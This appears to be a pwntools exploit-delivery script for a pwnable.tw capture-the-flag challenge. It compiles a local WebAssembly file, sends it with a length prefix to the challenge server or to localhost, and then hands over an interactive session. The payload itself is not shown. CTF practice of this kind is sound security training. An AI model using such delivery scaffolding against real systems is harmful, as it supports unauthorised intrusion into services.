from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=3001,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
if is_gaibu:
    host = "chall.pwnable.tw"
    port = 10000
else:
    host = args.host
    port = args.port

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, b'\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(n, verbose=True):
    s = r.recv(n)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip(b'\n')

def sendline(s, verbose=True):
    if log and verbose:
        pass
        #print(s)
    r.sendline(s)

def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

####################################

def menu(choice):
    recvuntil(b':')
    sendline(str(choice))

# receive and send
def rs(s, new_line=True, r=b':'):
    recvuntil(r)
    s = str(s)
    if new_line:
        sendline(s)
    else:
        send(s)

#import os
os.system("cd vuln && /home/ubuntu/tools/wabt-1.0.34/bin/wat2wasm vuln.wat -o vuln")
#os.system("cd vuln && /home/ubuntu/wasi-sdk-22.0/bin/clang vuln.c -o vuln")
filename="./vuln/vuln"

with open(filename, "rb") as f:
    binary = f.read()
#binary = b"\x00asm" * (256 // 8)
#binary= b"\x00asmhogeasdfasdfasdf"
print("size:", len(binary))

recvuntil(b"Give wasm plz:")
l = len(binary)+ 2
s = bytes([l // 256, l% 256 ])
wait_for_attach()
send(s)
print(recvuntil(b"bytes plz:").decode().strip() + " bytes plz:")
sendline(binary)
sendline(b"")
interactive()
